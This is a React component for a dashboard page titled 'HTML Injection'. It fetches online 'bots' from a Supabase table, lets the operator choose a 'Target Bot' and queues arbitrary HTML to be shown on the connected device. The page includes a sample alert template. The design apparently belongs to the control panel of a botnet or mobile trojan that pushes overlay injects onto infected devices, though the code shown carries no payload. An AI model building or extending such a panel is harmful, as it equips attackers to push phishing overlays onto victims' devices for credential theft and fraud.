import { useState, useEffect } from "react";
import DashboardLayout from "@/components/DashboardLayout";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Textarea } from "@/components/ui/textarea";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Code, Send } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";

const Injection = () => {
  const [bots, setBots] = useState<any[]>([]);
  const [selectedBot, setSelectedBot] = useState("");
  const [htmlContent, setHtmlContent] = useState("");
  const [loading, setLoading] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    fetchBots();
  }, []);

  const fetchBots = async () => {
    const { data } = await supabase
      .from("bots")
      .select("*")
      .eq("status", "online");
    setBots(data || []);
  };

  const injectHTML = async () => {
    if (!selectedBot || !htmlContent) {
      toast({
        title: "Error",
        description: "Please select a bot and enter HTML content",
        variant: "destructive",
      });
      return;
    }

    setLoading(true);

    const { data: { user } } = await supabase.auth.getUser();
    if (!user) return;

    const { error } = await supabase.from("injections").insert({
      user_id: user.id,
      bot_id: selectedBot,
      html_content: htmlContent,
      status: "pending",
    });

    if (error) {
      toast({
        title: "Error",
        description: error.message,
        variant: "destructive",
      });
    } else {
      toast({
        title: "Success",
        description: "HTML injection queued successfully",
      });
      setHtmlContent("");
    }

    setLoading(false);
  };

  return (
    <DashboardLayout>
      <div className="p-8">
        <div className="mb-8">
          <h1 className="text-3xl font-bold text-foreground mb-2">
            HTML Injection
          </h1>
          <p className="text-muted-foreground">
            Inject custom HTML content to display on connected devices
          </p>
        </div>

        <Card className="p-6 bg-card border-border">
          <div className="flex items-center gap-3 mb-6">
            <div className="p-3 rounded-lg bg-primary/10">
              <Code className="w-6 h-6 text-primary" />
            </div>
            <h2 className="text-xl font-semibold text-foreground">
              Inject HTML
            </h2>
          </div>

          <div className="space-y-6">
            <div>
              <Label htmlFor="bot-select" className="text-foreground">
                Select Target Bot
              </Label>
              <Select value={selectedBot} onValueChange={setSelectedBot}>
                <SelectTrigger className="bg-input border-border text-foreground mt-2">
                  <SelectValue placeholder="Choose a bot" />
                </SelectTrigger>
                <SelectContent>
                  {bots.map((bot) => (
                    <SelectItem key={bot.id} value={bot.id}>
                      {bot.name} - {bot.model}
                    </SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>

            <div>
              <Label htmlFor="html-content" className="text-foreground">
                HTML Content
              </Label>
              <Textarea
                id="html-content"
                value={htmlContent}
                onChange={(e) => setHtmlContent(e.target.value)}
                placeholder="<div>Your HTML content here...</div>"
                className="bg-input border-border text-foreground mt-2 min-h-[300px] font-mono"
              />
            </div>

            <Button
              onClick={injectHTML}
              disabled={loading}
              className="bg-primary hover:bg-primary/90 text-primary-foreground"
            >
              <Send className="w-4 h-4 mr-2" />
              Inject HTML
            </Button>
          </div>
        </Card>

        {/* Example Templates */}
        <Card className="p-6 bg-card border-border mt-6">
          <h3 className="text-lg font-semibold text-foreground mb-4">
            Example Templates
          </h3>
          <div className="space-y-4">
            <div className="p-4 rounded-lg bg-muted/30 border border-border">
              <p className="text-sm text-muted-foreground mb-2">
                Simple Alert
              </p>
              <code className="text-xs text-foreground font-mono">
                {`<div style="padding: 20px; background: red; color: white; text-align: center;">
  <h1>ALERT!</h1>
  <p>This is a test injection</p>
</div>`}
              </code>
            </div>
          </div>
        </Card>
      </div>
    </DashboardLayout>
  );
};

export default Injection;
